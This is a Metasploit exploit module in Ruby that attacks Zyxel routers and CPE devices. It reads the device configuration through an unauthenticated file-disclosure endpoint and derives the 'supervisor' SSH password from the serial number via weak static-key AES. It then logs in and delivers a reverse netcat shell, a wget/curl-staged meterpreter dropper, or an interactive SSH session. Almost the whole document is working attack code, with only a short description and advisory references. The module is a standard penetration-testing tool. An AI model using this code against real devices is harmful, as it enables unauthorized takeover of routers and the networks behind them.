##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'socket'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SSH
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  attr_accessor :ssh_socket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zyxel chained RCE using LFI and weak AES encryption',
        'Description' => %q{
          This module exploits multiple vulnerabilities in the zhttpd binary (/bin/zhttpd)
          and zcmd binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices.
          The remote code execution vulnerability can be exploited by chaining the local file disclosure
          vulnerability in the zhttp binary that allows an unauthenticated attacker to read the entire configuration
          of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.
          With this information disclosure, the attacker can determine if the router is reachable via ssh
          and uses the second vulnerability in the` zcmd` binary to derive the `supervisor` password exploiting
          a weak implementation of AES symmetric encrypting with static keys using the device serial number.

          After exploitation, an attacker will be able to execute any command as user `supervisor`.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Author of exploit chain and MSF module contributor
          'SEC Consult Vulnerability Lab',
          'Thomas Rinsma',
          'Bogi Napoleon WennerstrÃ¸m'
        ],
        'References' => [
          ['URL', 'https://r.sec-consult.com/zyxsploit'],
          ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],
          ['URL', 'https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/'],
          ['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],
          ['URL', 'https://attackerkb.com/topics/dkw2Y2zdyN/zyxel-chained-rce-using-lfi-and-weak-aes-encryption-no-cve']
        ],
        'DisclosureDate' => '2022-02-01',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_MIPSBE],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_MIPSBE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Interactive SSH',
            {
              'DefaultOptions' => {
                'PAYLOAD' => 'generic/ssh/interact'
              },
              'Payload' => {
                'Compat' => {
                  'PayloadType' => 'ssh_interact'
                }
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false,
          'WfsDelay' => 5
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def get_configuration
    # Get the device configuration by exploiting the LFI vulnerability
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/Export_Log?/data/zcfg_config.json')
    })
  end

  def process_configuration(res)
    # Initiate the hash_config
    hash_config = { 'hardware' => nil, 'software' => nil, 'serial' => nil, 'ssh_user' => nil, 'ssh_port' => nil, 'ssh_wan_access' => nil, 'ssh_service_enabled' => nil }
    # Parse the device configuration json file
    begin
      res_json = res.get_json_document
    rescue JSON::ParserError => e
      print_error(Failure::Unknown, "Unable to parse the JSON response. Error: #{e}")
      return hash_config
    end
    if res_json.nil? || res_json.blank?
      print_error(Failure::NotFound, 'No device configuration file found.')
      return hash_config
    end
    # process json output and retrieve information about supervisor user, ssh port and ssh WAN service status
    # Also grab hardware and software version including the serial number to crack weak AES encrypted password of user supervisor

    hash_config['hardware'] = res_json['DeviceInfo']['HardwareVersion'] if !res_json.dig('DeviceInfo', 'HardwareVersion').nil?
    hash_config['software'] = res_json['DeviceInfo']['SoftwareVersion'] if !res_json.dig('DeviceInfo', 'SoftwareVersion').nil?
    hash_config['serial'] = res_json['DeviceInfo']['SerialNumber'] if !res_json.dig('DeviceInfo', 'SerialNumber').nil?

    if !res_json.dig('X_ZYXEL_LoginCfg', 'LogGp').nil?
      res_json['X_ZYXEL_LoginCfg']['LogGp'].map do |login|
        if !login['Account'].nil? && hash_config['ssh_user'] != 'supervisor'
          login['Account'].map do |account|
            if account['Username'] == 'supervisor'
              hash_config['ssh_user'] = account['Username']
              break
            end
          end
        else
          break
        end
      end
    end
    if !res_json.dig('X_ZYXEL_RemoteManagement', 'Service').nil?
      res_json['X_ZYXEL_RemoteManagement']['Service'].map do |service|
        next unless service['Name'] == 'SSH'

        hash_config['ssh_port'] = service['Port']
        hash_config['ssh_wan_access'] = service['Mode']
        hash_config['ssh_service_enabled'] = service['Enable']
        break
      end
    end
    return hash_config
  end

  def crack_supervisor_pwd(serial)
    # crack supervisor password by exploiting a weak implementation of AES symmetric encrypting with static keys using the device serial number
    # using system call for now. TODO: rewrite functions in native ruby
    # there are two confirmed hashing functions that can  derive the supervisor password from the serial number, called SerialNumMethod2 and SerialNumMethod3
    # both passwords will be returned in a password hash

    hash_pwd = { 'method2' => nil, 'method3' => nil }
    # SerialNumMethod2
    result = `python ~/zyxel_exploit/zyxel-vmg8825-keygen/main.py -f zcfgBeCommonGenKeyBySerialNumMethod2 #{serial}`
    pwd = result.partition(':')
    hash_pwd['method2'] = pwd.last.strip

    # SerialNumMethod3
    result = `python ~/zyxel_exploit/zyxel-vmg8825-keygen/main.py -f zcfgBeCommonGenKeyBySerialNumMethod3 #{serial}`
    pwd = result.partition(':')
    hash_pwd['method3'] = pwd.last.strip

    print_status("decrypted password SerialNumMethod3: #{hash_pwd['method3']}")
    print_status("decrypted password SerialNumMethod2: #{hash_pwd['method2']}")
    return hash_pwd
  end

  def execute_command(cmd, _opts = {})
    print_status("Executing #{cmd}")
    begin
      Timeout.timeout(datastore['WfsDelay']) { ssh_socket.exec!(cmd) }
    rescue Timeout::Error
      # print_warning('Timed out while waiting for command to return')
      @timeout = true
    end
  end

  def do_login(ip, user, pass, ssh_port)
    # create SSH session and login
    # if login is successfull, return true else return false. All other errors will trigger an immediate fail
    opts = ssh_client_defaults.merge({
      auth_methods: ['password', 'keyboard-interactive'],
      port: ssh_port,
      password: pass
    })

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        self.ssh_socket = Net::SSH.start(ip, user, opts)
      end
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
      return false
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end

    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket
    return true
  end

  def check_port(port)
    # checks network port and return true if open and false if closed.
    (sleep datastore['WfsDelay']) until begin
      TCPSocket.open(datastore['RHOST'], port)
    rescue StandardError
      return false
    end
    return true
  end

  def check
    res = get_configuration
    return CheckCode::Safe if res.nil? || res.code != 200

    config = process_configuration(res)

    # check if all hash key/value pairs are populated
    print_status("hardware: #{config['hardware']} software: #{config['software']} serial: #{config['serial']}")
    print_status("ssh_user: #{config['ssh_user']} ssh_port: #{config['ssh_port']} ssh_wan_access: #{config['ssh_wan_access']} ssh_service_enabled: #{config['ssh_service_enabled']}")
    if config['serial'].nil? || config['ssh_user'].nil? || config['ssh_port'].nil? || config['ssh_wan_access'].nil? || config['ssh_service_enabled'].nil?
      return CheckCode::Unknown('Device serial, supervisor user, SSH port, or SSH WAN access/service status not found.')
    end

    # check if ssh_port is open, ssh service is enabled and accessible from the WAN side
    if config['ssh_wan_access'] == 'LAN_WAN' && config['ssh_service_enabled'] && check_port(config['ssh_port'])
      return CheckCode::Vulnerable
    elsif !config['ssh_service_enabled']
      return CheckCode::Safe('SSH service is NOT available.')
    else
      return CheckCode::Detected("WAN access to SSH service is NOT allowed or SSH port #{config['ssh_port']} is closed. Try exploit from the LAN side.")
    end
  end

  def exploit
    res = get_configuration
    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if res.nil? || res.code != 200

    config = process_configuration(res)

    # check if all hash key/value pairs are populated
    print_status("hardware: #{config['hardware']} software: #{config['software']} serial: #{config['serial']}")
    print_status("ssh_user: #{config['ssh_user']} ssh_port: #{config['ssh_port']} ssh_wan_access: #{config['ssh_wan_access']} ssh_service_enabled: #{config['ssh_service_enabled']}")
    if config['serial'].nil? || config['ssh_user'].nil? || config['ssh_port'].nil? || config['ssh_wan_access'].nil? || config['ssh_service_enabled'].nil?
      fail_with(Failure::NotVulnerable, 'Device serial, supervisor user, SSH port or SSH WAN access/service status not found.')
    end

    if config['ssh_wan_access'] == 'LAN_WAN' && config['ssh_service_enabled'] && check_port(config['ssh_port'])
      print_status("SSH service is available and SSH Port #{config['ssh_port']} is open. Continue to login.")
    elsif !config['ssh_service_enabled']
      fail_with(Failure::NotVulnerable, 'SSH service is NOT available.')
    else
      fail_with(Failure::Unreachable, "WAN access to SSH service is NOT allowed or SSH port #{config['ssh_port']} is closed. Try exploit from the LAN side.")
    end

    supervisor_pwd = crack_supervisor_pwd(config['serial'])
    # try supervisor password generated by SerialNumMethod3 first, if it fails then try the password generated by SerialNumMethod2
    if !do_login(datastore['RHOST'], config['ssh_user'], supervisor_pwd['method3'], config['ssh_port']) && !do_login(datastore['RHOST'], config['ssh_user'], supervisor_pwd['method2'], config['ssh_port'])
      fail_with(Failure::NoAccess, 'Both supervisor password derivation methods failed to authenticate.')
    end

    if target.name == 'Interactive SSH'
      handler(ssh_socket)
      return
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager(linemax: 500)
    end
    @timeout ? ssh_socket.shutdown! : ssh_socket.close
  end
end
